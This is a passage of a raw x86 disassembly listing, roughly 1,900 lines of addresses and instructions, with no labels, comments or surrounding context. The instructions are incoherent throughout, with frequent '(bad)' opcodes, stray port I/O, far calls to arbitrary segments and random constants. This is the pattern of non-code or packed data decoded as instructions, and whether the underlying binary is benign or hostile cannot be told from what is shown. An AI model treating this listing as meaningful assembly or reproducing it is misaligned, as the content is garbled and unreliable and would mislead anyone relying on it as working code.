  422cd4:	aam    0x27
  422cd6:	outs   dx,DWORD PTR ds:[esi]
  422cd7:	cmp    eax,0xb0cfa282
  422cdc:	sbb    eax,0xaf34dbd1
  422ce1:	adc    al,BYTE PTR [edx+eax*8-0x34400290]
  422ce8:	xor    ah,bh
  422cea:	jns    0x422cde
  422cec:	adc    ebp,DWORD PTR [ebp+esi*1-0x34]
  422cf0:	jo     0x422cb6
  422cf2:	xor    al,0x4a
  422cf4:	mov    ecx,0x7d7a0f42
  422cf9:	add    al,ah
  422cfb:	int    0xc4
  422cfd:	mov    al,0xd6
  422cff:	jne    0x422ca7
  422d01:	pop    ecx
  422d02:	(bad)
  422d05:	push   DWORD PTR [edx-0x17115406]
  422d0b:	jl     0x422c95
  422d0d:	sti    
  422d0e:	xchg   esi,eax
  422d0f:	dec    esp
  422d10:	and    cl,dl
  422d12:	add    BYTE PTR [ebx-0x7160abe1],dh
  422d18:	inc    edi
  422d19:	outs   dx,DWORD PTR ds:[esi]
  422d1a:	fs push ds
  422d1c:	js     0x422ccb
  422d1e:	int    0x21
  422d20:	push   edx
  422d21:	loope  0x422d51
  422d23:	inc    esi
  422d24:	push   0xc7a2249f
  422d29:	or     DWORD PTR [edi-0x64],eax
  422d2c:	dec    ebp
  422d2d:	mov    bl,0x35
  422d2f:	and    eax,0xc2430e5a
  422d34:	xchg   edi,eax
  422d35:	mov    BYTE PTR [edi-0x1e],ch
  422d38:	add    BYTE PTR [ecx+eax*4],ah
  422d3b:	mov    ebx,?
  422d3d:	xchg   esp,eax
  422d3e:	inc    ecx
  422d3f:	mov    ebx,0x5ea7d09d
  422d44:	push   ecx
  422d45:	out    0x89,al
  422d47:	and    DWORD PTR [eax+0x242f228],edx
  422d4d:	sbb    eax,DWORD PTR [edi-0x34]
  422d50:	and    al,0xcb
  422d52:	dec    esp
  422d53:	adc    DWORD PTR [ebp+0x7ae9b78],0x55
  422d5a:	xor    ebx,DWORD PTR [edi]
  422d5c:	inc    edi
  422d5d:	inc    esi
  422d5e:	push   0x6377cfeb
  422d63:	aaa    
  422d64:	bound  ebp,QWORD PTR [edx]
  422d66:	outs   dx,BYTE PTR ds:[esi]
  422d67:	in     al,dx
  422d68:	pop    eax
  422d69:	cld    
  422d6a:	mov    esp,0xe0fcfe9
  422d6f:	add    cl,bh
  422d71:	addr16 out 0xe8,al
  422d74:	es inc esi
  422d76:	aas    
  422d77:	and    eax,0x7a934c37
  422d7c:	jge    0x422d0f
  422d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d7f:	add    esi,DWORD PTR [edi+edi*4+0x8]
  422d83:	mov    edx,0x778a256f
  422d88:	adc    edx,ecx
  422d8a:	jo     0x422d3a
  422d8c:	pop    ecx
  422d8d:	ret    0xe2c0
  422d90:	(bad)  
  422d91:	lds    ebp,FWORD PTR [ecx-0x4b47a77d]
  422d97:	cmp    eax,DWORD PTR [esi]
  422d99:	dec    edi
  422d9a:	push   ebp
  422d9b:	rcl    ecx,0xdb
  422d9e:	or     dl,bl
  422da0:	xchg   dl,bh
  422da2:	sub    ch,ch
  422da4:	mov    ah,0x1f
  422da6:	or     eax,0xcf5fdf7
  422dab:	ror    BYTE PTR [ebp+0x50],1
  422dae:	jb     0x422d6c
  422db0:	icebp  
  422db1:	dec    edi
  422db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422db3:	or     dl,BYTE PTR [ebp+0x46]
  422db6:	(bad)  [esi-0x13]
  422db9:	ja     0x422d82
  422dbb:	cld    
  422dbc:	mov    ds:0x3cf08970,eax
  422dc1:	(bad)  
  422dc2:	mov    ebx,0x3c2a25ca
  422dc7:	push   ss
  422dc8:	mov    WORD PTR [ebx],?
  422dca:	je     0x422d8b
  422dcc:	push   ecx
  422dcd:	mov    ebx,0xee8bdf1
  422dd2:	adc    ebp,DWORD PTR [ebp+0x7ccff4c8]
  422dd8:	fst    st(6)
  422dda:	xchg   esp,eax
  422ddb:	add    bh,dh
  422ddd:	aaa    
  422dde:	(bad)  
  422ddf:	es test edi,ebp
  422de2:	out    0xdf,eax
  422de4:	lds    ecx,FWORD PTR [ebx-0x559dab6d]
  422dea:	cdq    
  422deb:	and    ebp,DWORD PTR ds:0x9e7eab84
  422df1:	xor    bl,BYTE PTR [ecx+0x136e21f2]
  422df7:	retf   0x68a1
  422dfa:	cmc    
  422dfb:	imul   eax,ebp,0xda34d3aa
  422e01:	loope  0x422e70
  422e03:	push   0xffffffc0
  422e05:	pop    ebp
  422e06:	(bad)  
  422e07:	(bad)  
  422e09:	lea    ebx,[esi+0x64]
  422e0c:	div    DWORD PTR [edx+0x139b7d94]
  422e12:	sub    ebp,DWORD PTR [eax]
  422e14:	out    0x34,al
  422e16:	(bad)  
  422e17:	fild   QWORD PTR [ecx]
  422e19:	retf   0x2418
  422e1c:	inc    edx
  422e1d:	add    al,0xa9
  422e1f:	loopne 0x422e9b
  422e21:	adc    eax,0xe789ab81
  422e26:	cmp    ebx,DWORD PTR ds:0xfca6b443
  422e2d:	jmp    0x422e8e
  422e2f:	mov    cl,0x96
  422e31:	xchg   edi,eax
  422e32:	jo     0x422e72
  422e34:	cli    
  422e35:	mov    ebp,0xe5427f60
  422e3a:	out    0x12,eax
  422e3c:	jmp    0xecf2:0x741b9119
  422e43:	add    al,0x95
  422e45:	sub    DWORD PTR [edi+0x28],ebx
  422e48:	repnz pop eax
  422e4a:	or     edx,DWORD PTR [eax-0x4905a8c2]
  422e50:	shr    DWORD PTR [eax+0x85721f],0x60
  422e57:	cmc    
  422e58:	xchg   ebp,eax
  422e59:	(bad)  
  422e5a:	ds fs inc ecx
  422e5d:	outs   dx,BYTE PTR ds:[esi]
  422e5e:	dec    ebx
  422e5f:	mov    ds,ecx
  422e61:	xchg   esi,eax
  422e62:	js     0x422ed9
  422e64:	cdq    
  422e65:	pop    esp
  422e66:	fcom   QWORD PTR [eax-0x3aeddc17]
  422e6c:	mov    ds:0xdca84611,eax
  422e71:	mov    dh,0x72
  422e73:	jnp    0x422e5c
  422e75:	lods   eax,DWORD PTR ds:[esi]
  422e76:	test   al,0xd0
  422e78:	push   edi
  422e79:	lods   al,BYTE PTR ds:[esi]
  422e7a:	mov    bh,0xe8
  422e7c:	jp     0x422e29
  422e7e:	fmul   DWORD PTR [ebx-0x68]
  422e81:	fsub   QWORD PTR [edi-0x7]
  422e84:	xlat   BYTE PTR ds:[ebx]
  422e85:	mov    WORD PTR cs:[eax+0x7c2635ce],?
  422e8c:	or     eax,0xd5043912
  422e91:	or     DWORD PTR [edx+esi*4+0x45bbd24b],0x2c7b9080
  422e9c:	jp     0x422ed8
  422e9e:	or     DWORD PTR [edi],edx
  422ea0:	lea    ebp,[eax-0x1]
  422ea3:	cmp    eax,0xdd9bcea
  422ea8:	fbstp  TBYTE PTR [edx]
  422eaa:	adc    BYTE PTR [edi-0x3e],bh
  422ead:	inc    ebp
  422eae:	jp     0x422e30
  422eb0:	out    dx,al
  422eb1:	nop
  422eb2:	inc    edx
  422eb3:	ror    ebp,1
  422eb5:	jo     0x422ed2
  422eb7:	outs   dx,DWORD PTR ds:[esi]
  422eb8:	aad    0x4a
  422eba:	std    
  422ebb:	sub    edi,0x7b
  422ebe:	popa   
  422ebf:	sub    dl,dl
  422ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ec2:	mov    eax,ds:0xaf3f29ff
  422ec7:	push   edi
  422ec8:	fistp  DWORD PTR [ebp+0x4]
  422ecb:	xchg   DWORD PTR [eax-0x3755423e],eax
  422ed1:	call   0x47ad:0x2c74b334
  422ed8:	mov    bl,0x1a
  422eda:	push   ds
  422edb:	rcl    bl,cl
  422edd:	in     eax,dx
  422ede:	push   esi
  422edf:	je     0x422f09
  422ee1:	xchg   esp,eax
  422ee2:	pop    ds
  422ee3:	sar    esp,1
  422ee5:	push   eax
  422ee6:	push   esp
  422ee7:	out    dx,al
  422ee8:	imul   ebp,esp,0x74
  422eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422eec:	mov    ds:0xc9835ef8,al
  422ef1:	xor    edx,ebx
  422ef3:	retf   0xd5e
  422ef6:	mov    DWORD PTR [ecx],edi
  422ef8:	lods   al,BYTE PTR ds:[esi]
  422ef9:	push   ecx
  422efa:	cmp    eax,0xa1200ba2
  422eff:	scas   al,BYTE PTR es:[edi]
  422f00:	sbb    dl,0x9
  422f03:	push   ebp
  422f04:	repz call ebx
  422f07:	das    
  422f08:	sti    
  422f09:	test   DWORD PTR [ebx],0xf8b61d7
  422f0f:	xchg   DWORD PTR [ebx],esp
  422f11:	lods   al,BYTE PTR ds:[esi]
  422f12:	mov    dh,0x83
  422f14:	xlat   BYTE PTR ds:[ebx]
  422f15:	jnp    0x422f51
  422f17:	add    al,0x73
  422f19:	inc    eax
  422f1a:	std    
  422f1b:	and    al,0x67
  422f1d:	sbb    esp,DWORD PTR ds:0x62ec0d3e
  422f23:	cmp    cl,BYTE PTR [edi+0x71685af]
  422f29:	inc    edx
  422f2a:	vorps  xmm0,xmm1,XMMWORD PTR [eax+edi*1-0x55]
  422f30:	inc    edi
  422f31:	loope  0x422f57
  422f33:	iret   
  422f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f35:	les    ebp,FWORD PTR [ebx+0x6e]
  422f38:	enter  0x997f,0x4a
  422f3c:	dec    eax
  422f3d:	cli    
  422f3e:	push   edi
  422f3f:	inc    edi
  422f40:	mov    ebx,DWORD PTR [edi+0x563158db]
  422f46:	and    dl,dh
  422f48:	retf   0x2466
  422f4b:	ja     0x422ed1
  422f4d:	jmp    0x4942bab0
  422f52:	iret   
  422f53:	push   cs
  422f54:	or     BYTE PTR ds:0x4dcaa4f7,cl
  422f5a:	cmp    ecx,esi
  422f5c:	ja     0x422f13
  422f5e:	(bad)  
  422f5f:	ins    BYTE PTR es:[edi],dx
  422f60:	push   esp
  422f61:	mov    bh,0x51
  422f63:	loope  0x422faf
  422f65:	add    esp,eax
  422f67:	fadd   st,st(7)
  422f69:	das    
  422f6a:	cmp    eax,0x4c3a165e
  422f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f70:	call   0x635fe8d7
  422f75:	push   ecx
  422f76:	loope  0x422f67
  422f78:	adc    BYTE PTR [edx-0x1e93ab4c],0x9a
  422f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f80:	cmp    edx,ebp
  422f82:	push   edi
  422f83:	(bad)  
  422f85:	fucomi st,st(3)
  422f87:	pop    ecx
  422f88:	(bad)  
  422f89:	test   BYTE PTR [ebx],0xce
  422f8c:	and    al,0xbe
  422f8e:	scas   al,BYTE PTR es:[edi]
  422f8f:	cmc    
  422f90:	scas   eax,DWORD PTR es:[edi]
  422f91:	add    edi,DWORD PTR [eax+0x7fb2c1d2]
  422f97:	sub    BYTE PTR [ebx-0x22],dl
  422f9a:	add    al,0xfb
  422f9c:	mov    al,0xca
  422f9e:	imul   ebp,DWORD PTR [eax+edi*2+0x3d],0x17bb2fe6
  422fa6:	mov    BYTE PTR [esi],dh
  422fa8:	mov    dh,BYTE PTR [eax+0x19]
  422fab:	fist   DWORD PTR [edi-0x47]
  422fae:	dec    ebx
  422faf:	add    BYTE PTR [ebx-0x23fdb05f],bh
  422fb5:	and    al,0x9d
  422fb7:	jmp    0x422fe7
  422fb9:	jp     0x422fa3
  422fbb:	call   0x56914afc
  422fc0:	lock mov ah,0x98
  422fc3:	clc    
  422fc4:	mov    bl,0xe0
  422fc6:	or     ah,BYTE PTR [ebx-0x3d]
  422fc9:	out    0xb1,al
  422fcb:	ss mov ah,0x64
  422fce:	sub    eax,0x116e8d4
  422fd3:	ret    
  422fd4:	add    ebp,esp
  422fd6:	push   cs
  422fd7:	pop    edi
  422fd8:	mov    esi,0x25b4c183
  422fdd:	adc    eax,0xf994eefd
  422fe2:	and    eax,0x3649d69a
  422fe7:	fprem  
  422fe9:	call   0x6dc8ded9
  422fee:	xchg   esi,eax
  422fef:	fdiv   st,st(1)
  422ff1:	push   ds
  422ff2:	lods   eax,DWORD PTR ds:[esi]
  422ff3:	sub    al,0xf8
  422ff5:	and    eax,0x7bf6447a
  422ffa:	dec    edx
  422ffb:	(bad)  
  422ffc:	cmp    al,0xfc
  422ffe:	inc    ebp
  422fff:	(bad)  
  423000:	(bad)  [eax]
  423002:	retf   0x329f
  423005:	xlat   BYTE PTR ds:[ebx]
  423006:	push   eax
  423007:	pop    ds
  423008:	sub    BYTE PTR [ebp-0x34],0x87
  42300c:	jecxz  0x422fee
  42300e:	inc    esp
  42300f:	scas   al,BYTE PTR es:[edi]
  423010:	das    
  423011:	stos   DWORD PTR es:[edi],eax
  423012:	jl     0x42305c
  423014:	jecxz  0x422fa9
  423016:	das    
  423017:	and    eax,0xa825add5
  42301c:	pop    edx
  42301d:	scas   eax,DWORD PTR es:[edi]
  42301e:	pop    ds
  42301f:	cli    
  423020:	adc    BYTE PTR [eax-0x1c],ah
  423023:	pop    esp
  423024:	inc    ebp
  423025:	aam    0x1e
  423027:	repnz addr16 mov ebp,0x99731475
  42302e:	(bad)  
  42302f:	and    cl,BYTE PTR [esi-0x49c31dbf]
  423035:	popa   
  423036:	jge    0x423090
  423038:	out    dx,al
  423039:	ror    DWORD PTR [esi],0xf7
  42303c:	mov    ch,0x3e
  42303e:	pop    esp
  42303f:	mov    cl,0x70
  423041:	pop    ebx
  423042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423043:	mov    esi,0xef2f255e
  423048:	pop    esi
  423049:	dec    edi
  42304a:	xlat   BYTE PTR ds:[ebx]
  42304b:	lds    eax,FWORD PTR [ecx]
  42304d:	stc    
  42304e:	mov    ecx,0x6d086e76
  423053:	adc    edi,DWORD PTR gs:[edx+edi*1]
  423057:	mov    esp,0xd3d0d18b
  42305c:	ret    0x78e7
  42305f:	adc    eax,0x8058f35c
  423064:	in     al,0xc8
  423066:	inc    esp
  423067:	sub    eax,0xc0fbebb2
  42306c:	idiv   DWORD PTR [ecx-0xf379e9b]
  423072:	aam    0x68
  423074:	pop    esp
  423075:	imul   edx,DWORD PTR [ebp+0x6c],0x62
  423079:	adc    BYTE PTR fs:[ecx-0x75c39779],ch
  423080:	in     eax,dx
  423081:	and    al,0x80
  423083:	mov    al,ds:0x9d50af9b
  423088:	sbb    BYTE PTR [eax],0xf5
  42308b:	push   es
  42308c:	xor    BYTE PTR [ecx-0x56],ah
  42308f:	ret    
  423090:	add    al,0x30
  423092:	cmp    ecx,esi
  423094:	push   ebx
  423095:	arpl   WORD PTR [ebx-0x6392238f],cx
  42309b:	pop    edx
  42309c:	sub    al,0x84
  42309e:	or     bl,0x9d
  4230a1:	xchg   al,bl
  4230a3:	test   ah,bl
  4230a5:	call   0x1106:0x8e2d09e5
  4230ac:	and    ch,BYTE PTR ds:0xb1249ef9
  4230b2:	adc    DWORD PTR [ebx],esi
  4230b4:	adc    cl,BYTE PTR [eax+0x1c]
  4230b7:	pop    edx
  4230b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b9:	ss and al,0xcb
  4230bc:	add    edx,ebp
  4230be:	retf   
  4230bf:	mov    al,0xb3
  4230c1:	ror    DWORD PTR [ecx],1
  4230c3:	adc    ebx,edx
  4230c5:	out    0x4e,al
  4230c7:	sub    BYTE PTR [eax+0x3],dl
  4230ca:	cli    
  4230cb:	in     eax,0x4d
  4230cd:	fbld   TBYTE PTR [ebp-0x3303a677]
  4230d3:	xchg   BYTE PTR [eax*1+0x67a826ed],dl
  4230da:	push   0xffffffe7
  4230dc:	mov    dl,0x1f
  4230de:	iret   
  4230df:	sub    eax,0x95484910
  4230e4:	pop    DWORD PTR [edx]
  4230e6:	addr16 and al,0x76
  4230e9:	test   al,0xbb
  4230eb:	mov    ah,0xa0
  4230ed:	fnstenv [ecx]
  4230ef:	mov    ds:0xe3d84d42,al
  4230f4:	cmp    eax,DWORD PTR [ecx]
  4230f6:	dec    ebx
  4230f7:	cwde   
  4230f8:	lods   al,BYTE PTR ds:[esi]
  4230f9:	inc    ebx
  4230fa:	lea    edx,[esi-0x34689ef1]
  423100:	not    WORD PTR [ebx+0x66e85f93]
  423107:	xchg   edx,eax
  423108:	and    ebp,0x7070d1e3
  42310e:	ss ins DWORD PTR es:[edi],dx
  423110:	dec    esp
  423111:	adc    al,BYTE PTR [ebx]
  423113:	fucomip st,st(6)
  423115:	ret    
  423116:	loope  0x423127
  423118:	(bad)
  42311b:	call   0xb3c4:0xd8b566dc
  423122:	sub    edx,DWORD PTR [edi]
  423124:	ret    
  423125:	retf   0xb3d6
  423128:	test   BYTE PTR [edx-0x39],bh
  42312b:	cmp    al,BYTE PTR [ecx-0x1b0d4044]
  423131:	pop    edi
  423132:	stos   DWORD PTR es:[edi],eax
  423133:	leave  
  423134:	dec    edx
  423135:	(bad)  
  423137:	shr    DWORD PTR [ecx+0x3ad7c1bd],1
  42313d:	in     eax,0x1a
  42313f:	xlat   BYTE PTR ds:[ebx]
  423140:	dec    ecx
  423141:	(bad)  
  423142:	cld    
  423143:	xchg   edi,eax
  423144:	cmp    DWORD PTR [ebx+ebp*2-0x46ef5dd0],0xcaa6ef68
  42314f:	fidiv  WORD PTR [eax-0x41eb7378]
  423155:	cmp    ecx,DWORD PTR [edi]
  423157:	push   ss
  423158:	xchg   DWORD PTR [ebx],edx
  42315a:	loope  0x423176
  42315c:	dec    ebp
  42315d:	jns    0x4231c9
  42315f:	fcom   QWORD PTR [edi-0x4c97e7c2]
  423165:	jle    0x42316d
  423167:	es out 0x73,eax
  42316a:	or     BYTE PTR [edx+0x26],bh
  42316d:	into   
  42316e:	xor    DWORD PTR [eax+0x2ab25d59],ebx
  423174:	xchg   esp,eax
  423175:	mov    cl,0xb1
  423177:	popa   
  423178:	and    esp,DWORD PTR [ebx-0x71]
  42317b:	push   eax
  42317c:	les    eax,FWORD PTR [ebx+0x3dd14a7b]
  423182:	mov    ebp,DWORD PTR [esi+0x2119421e]
  423188:	test   BYTE PTR [ebp+0x69],cl
  42318b:	les    esi,FWORD PTR [eax+ebx*8-0x2b67f9a5]
  423192:	jmp    0xc96697e9
  423197:	push   bp
  423199:	shl    DWORD PTR [ebx+ecx*4],cl
  42319c:	add    eax,0xb74a0f5e
  4231a1:	out    dx,al
  4231a2:	and    BYTE PTR [edi-0xa4578f3],bl
  4231a8:	push   ebp
  4231a9:	xchg   edx,eax
  4231aa:	xchg   DWORD PTR [edi+0x4b],esi
  4231ad:	sbb    BYTE PTR [ebx],0xbb
  4231b0:	mov    DWORD PTR [eax],edi
  4231b2:	(bad)  
  4231b3:	sub    dl,BYTE PTR [ebp*1+0x2857f6da]
  4231ba:	into   
  4231bb:	imul   ebx,edx,0x41
  4231be:	add    BYTE PTR [ecx-0x155f7876],ch
  4231c4:	jae    0x42323e
  4231c6:	fs jmp 0x4231e3
  4231c9:	mov    edx,0xd47a443c
  4231ce:	ins    BYTE PTR es:[edi],dx
  4231cf:	xchg   ecx,eax
  4231d0:	cdq    
  4231d1:	scas   al,BYTE PTR es:[edi]
  4231d2:	jp     0x4231fe
  4231d4:	lds    ebx,FWORD PTR [edx-0x10]
  4231d7:	or     al,0x74
  4231d9:	mov    dh,0xeb
  4231db:	pop    ss
  4231dc:	cmp    eax,0xb4c22096
  4231e1:	inc    edx
  4231e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231e3:	js     0x423171
  4231e5:	push   cs
  4231e6:	push   edx
  4231e7:	xchg   edi,eax
  4231e8:	cmp    dh,BYTE PTR ds:0x2b801618
  4231ee:	xchg   ecx,eax
  4231ef:	cmp    al,0x77
  4231f1:	mov    ah,0xb0
  4231f3:	call   0x9b9:0x6b5d01c8
  4231fa:	sub    eax,0xa2dac8a9
  4231ff:	cmp    dh,bl
  423201:	push   esp
  423202:	mov    DWORD PTR [esi-0x4c],0x4f5c971a
  423209:	xlat   BYTE PTR ds:[ebx]
  42320a:	in     al,dx
  42320b:	ret    0x2e11
  42320e:	dec    edx
  42320f:	xchg   esp,eax
  423210:	inc    ebp
  423211:	mov    BYTE PTR [ebx+0xd],bl
  423214:	jae    0x4231aa
  423216:	pop    ds
  423217:	pop    ss
  423218:	dec    eax
  423219:	aad    0x95
  42321b:	or     al,dl
  42321d:	and    DWORD PTR [ecx+0x4e3906ad],edi
  423223:	mov    al,0xa
  423225:	repnz push ebp
  423227:	mov    bl,0xde
  423229:	add    al,0xd0
  42322b:	xchg   esi,eax
  42322c:	jbe    0x42325c
  42322e:	out    dx,eax
  42322f:	cmp    al,0x5f
  423231:	xor    cl,BYTE PTR [edi]
  423233:	add    al,0xa3
  423235:	sbb    DWORD PTR [edi+0x62],ebx
  423238:	mov    eax,0x5dca7cf5
  42323d:	mov    ecx,0xac41750e
  423242:	pop    es
  423243:	mov    ecx,0xed078940
  423248:	sub    cl,bl
  42324a:	mov    bl,0x82
  42324c:	scas   eax,DWORD PTR es:[edi]
  42324d:	dec    esp
  42324e:	pop    ss
  42324f:	inc    ecx
  423250:	test   BYTE PTR [edx],dl
  423252:	add    al,0xd8
  423254:	mov    ds:0x1bd1114d,eax
  423259:	in     al,0xd7
  42325b:	int3   
  42325c:	loopne 0x4232b0
  42325e:	out    dx,al
  42325f:	(bad)  
  423260:	fsubrp st(5),st
  423262:	in     al,0xe
  423264:	mov    ds:0x63fba1f6,eax
  423269:	rcr    ah,1
  42326b:	jmp    0x191effaf
  423270:	in     al,dx
  423271:	add    eax,0xd45c6238
  423276:	pop    eax
  423277:	mov    al,ds:0x7a3811d0
  42327c:	cld    
  42327d:	pop    ebx
  42327e:	cmp    eax,0x2bd7c04
  423283:	out    0x66,al
  423285:	dec    ebx
  423286:	loop   0x4232c6
  423288:	div    BYTE PTR [esp+ebx*8-0x3204d975]
  42328f:	mov    ah,0xb6
  423291:	retf   0x5154
  423294:	aaa    
  423295:	mov    ebp,0xa57d28d6
  42329a:	adc    eax,0x853ad348
  42329f:	push   edi
  4232a0:	ret    0x8cb7
  4232a3:	jmp    DWORD PTR ds:0x92be58cd
  4232a9:	cs push ebx
  4232ab:	ins    BYTE PTR es:[edi],dx
  4232ac:	mov    esi,DWORD PTR [ebx]
  4232ae:	jmp    0x4232d1
  4232b0:	cmp    bh,dl
  4232b2:	stos   BYTE PTR es:[edi],al
  4232b3:	pushf  
  4232b4:	push   es
  4232b5:	in     al,0x4
  4232b7:	sub    eax,0x8ba915a8
  4232bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232bd:	in     eax,0xb0
  4232bf:	pop    esp
  4232c0:	int    0x60
  4232c2:	in     eax,dx
  4232c3:	pusha  
  4232c4:	je     0x4232e5
  4232c6:	sar    BYTE PTR [esi],1
  4232c8:	push   es
  4232c9:	push   ebp
  4232ca:	repnz xlat BYTE PTR gs:[ebx]
  4232cd:	cmp    eax,0x77750c33
  4232d2:	sub    al,0xb2
  4232d4:	xchg   esi,eax
  4232d5:	cmp    BYTE PTR [edx-0x6b36318e],cl
  4232db:	(bad)  
  4232dd:	test   al,0xb2
  4232df:	mov    esp,0xeeb24433
  4232e4:	sub    DWORD PTR [eax-0x58],0xe9d59552
  4232eb:	popa   
  4232ec:	jns    0x42333f
  4232ee:	clc    
  4232ef:	retf   0x4a45
  4232f2:	sub    BYTE PTR [ebx],cl
  4232f4:	push   cs
  4232f5:	js     0x423348
  4232f7:	mov    dl,0xcc
  4232f9:	aas    
  4232fa:	es ja  0x4232f7
  4232fd:	mov    ds:0x269ac62e,al
  423302:	sbb    esp,0xa8826b7c
  423308:	(bad)  
  423309:	outs   dx,DWORD PTR ds:[esi]
  42330a:	pushf  
  42330b:	inc    edx
  42330c:	mov    esp,0x29c54306
  423311:	mov    ecx,0xa77f41a1
  423316:	(bad)
  42331a:	mov    WORD PTR [ecx-0x653b31e3],fs
  423320:	psubsw mm3,QWORD PTR [esi+edx*2-0x46]
  423325:	ins    DWORD PTR es:[edi],dx
  423326:	sbb    eax,0xf604c16
  42332b:	sub    al,0x84
  42332d:	fst    QWORD PTR [ebx]
  42332f:	adc    al,0xd9
  423331:	sub    DWORD PTR [edi],ebx
  423333:	cs mov eax,0xbbe15866
  423339:	mov    eax,ds:0x6e0cfef6
  42333e:	and    esp,DWORD PTR [ecx+0x1]
  423341:	mov    esp,0xdefb4453
  423346:	pusha  
  423347:	lods   eax,DWORD PTR ds:[esi]
  423348:	mov    gs,WORD PTR gs:[edx-0x40]
  42334c:	inc    eax
  42334d:	dec    ecx
  42334e:	mov    eax,ds:0xae10a1f5
  423353:	sub    eax,0x913b93f9
  423358:	dec    ebx
  423359:	or     BYTE PTR [edx+0x14dbbfce],0x42
  423360:	aas    
  423361:	cmp    DWORD PTR [esi],esp
  423363:	test   eax,0x51a951c9
  423368:	scas   eax,DWORD PTR es:[edi]
  423369:	add    cl,BYTE PTR [eax+0x501b5f6d]
  42336f:	sub    eax,0x6fffd3d7
  423374:	fisubr WORD PTR ds:[esi]
  423377:	xor    dh,cl
  423379:	pop    edx
  42337a:	mov    edx,0x798671ea
  42337f:	jmp    0xa1443161
  423384:	adc    BYTE PTR ds:0x67fdff05,dl
  42338a:	pop    esp
  42338b:	xchg   DWORD PTR [esi-0x775d1351],eax
  423391:	mov    eax,ds:0x21cd8259
  423396:	pop    edi
  423397:	scas   al,BYTE PTR es:[edi]
  423398:	ja     0x4233c1
  42339a:	push   esi
  42339b:	repz bound edx,QWORD PTR [eax]
  42339e:	addr16 pop ecx
  4233a0:	bound  esp,QWORD PTR [edx+0x11]
  4233a3:	mov    eax,0xba8a4126
  4233a8:	xchg   esi,eax
  4233a9:	mov    ebp,DWORD PTR [esp+esi*4]
  4233ac:	inc    edx
  4233ad:	or     ebp,DWORD PTR [edx+0x555ee84f]
  4233b3:	cmp    eax,0xe525771a
  4233b8:	sbb    ax,0x65ba
  4233bc:	pop    ss
  4233bd:	inc    ebx
  4233be:	jnp    0x4233c4
  4233c0:	sub    BYTE PTR [ebx-0x5d],al
  4233c3:	or     al,0xfe
  4233c5:	(bad)  
  4233c6:	pop    ebp
  4233c7:	push   0x42ee5a86
  4233cc:	lods   al,BYTE PTR ds:[esi]
  4233cd:	inc    esp
  4233ce:	mov    ah,0x8e
  4233d0:	sub    eax,0xe5131b66
  4233d5:	mov    ebx,0x9b74e754
  4233da:	mov    ebp,0xcd869224
  4233df:	les    esi,FWORD PTR [esi+0x45]
  4233e2:	out    dx,eax
  4233e3:	ret    0xb1ea
  4233e6:	fs cmp ch,0xad
  4233ea:	inc    ebp
  4233eb:	pop    esp
  4233ec:	mov    gs,WORD PTR [esi-0x2d]
  4233ef:	jae    0x42342b
  4233f1:	or     BYTE PTR [edi+0x2a14c87b],0xeb
  4233f8:	and    BYTE PTR [ecx-0x4ef9597e],bh
  4233fe:	repz cmp ebx,esi
  423401:	imul   ebp,esp,0xffffffdf
  423404:	mov    es,WORD PTR [ebp-0x34e7b57f]
  42340a:	sub    ch,BYTE PTR [eax+esi*1-0x8c8f03f]
  423411:	dec    ecx
  423412:	sub    ch,BYTE PTR ds:0x6a2f3120
  423418:	add    DWORD PTR [ebp+0x10],edi
  42341b:	inc    ebp
  42341c:	das    
  42341d:	inc    esi
  42341e:	cs stc 
  423420:	push   edx
  423421:	push   esi
  423422:	pushf  
  423423:	int    0xa5
  423425:	fwait
  423426:	dec    edx
  423427:	adc    eax,0x36ad5093
  42342c:	sub    esi,ebx
  42342e:	aaa    
  42342f:	sbb    DWORD PTR [edi],0x1f859cde
  423435:	(bad)  
  423437:	mov    eax,DWORD PTR [esi-0x5d]
  42343a:	cmp    ch,BYTE PTR [eax+0x4c]
  42343d:	fisubr WORD PTR [edx]
  42343f:	mov    dh,BYTE PTR [ebp-0x1b]
  423442:	sbb    edi,DWORD PTR [ebp+0x71b606cf]
  423448:	aam    0xce
  42344a:	call   0xdaa8a8b
  42344f:	xor    BYTE PTR [edi+0x31e2eec3],ah
  423455:	add    al,0x5b
  423457:	jne    0x423433
  423459:	cld    
  42345a:	sar    DWORD PTR [ecx-0x5d],cl
  42345d:	nop
  42345e:	clc    
  42345f:	bound  esi,QWORD PTR [eax-0x19c4d6a2]
  423465:	xor    esp,DWORD PTR [ecx-0x21]
  423468:	xor    edi,ebx
  42346a:	mov    ecx,0xb48ddc83
  42346f:	aam    0xe8
  423471:	pop    esi
  423472:	jae    0x423443
  423474:	in     eax,0x1b
  423476:	dec    ecx
  423477:	addr16 mov ebp,0x7edde437
  42347d:	jp     0x423470
  42347f:	fsub   DWORD PTR [ecx]
  423481:	add    cl,al
  423483:	retf   
  423484:	xchg   esi,eax
  423485:	or     BYTE PTR [ecx-0x12722ce],ch
  42348b:	xor    dl,al
  42348d:	adc    eax,0x14df678c
  423492:	xor    ch,dl
  423494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423495:	mov    al,0x18
  423497:	xchg   ebp,eax
  423498:	loope  0x423447
  42349a:	fmul   DWORD PTR [eax+0x4206625a]
  4234a0:	pop    ecx
  4234a1:	das    
  4234a2:	inc    esp
  4234a3:	aaa    
  4234a4:	xor    ch,BYTE PTR [esi]
  4234a6:	hlt    
  4234a7:	aam    0x29
  4234a9:	inc    esp
  4234aa:	mov    al,ds:0x237591d2
  4234af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234b1:	outs   dx,DWORD PTR ds:[esi]
  4234b2:	popa   
  4234b3:	mov    eax,ds:0xa65d90f9
  4234b8:	push   edi
  4234b9:	xchg   ebx,eax
  4234ba:	loope  0x4234ae
  4234bc:	dec    edi
  4234bd:	arpl   WORD PTR [eax],dx
  4234bf:	pop    edx
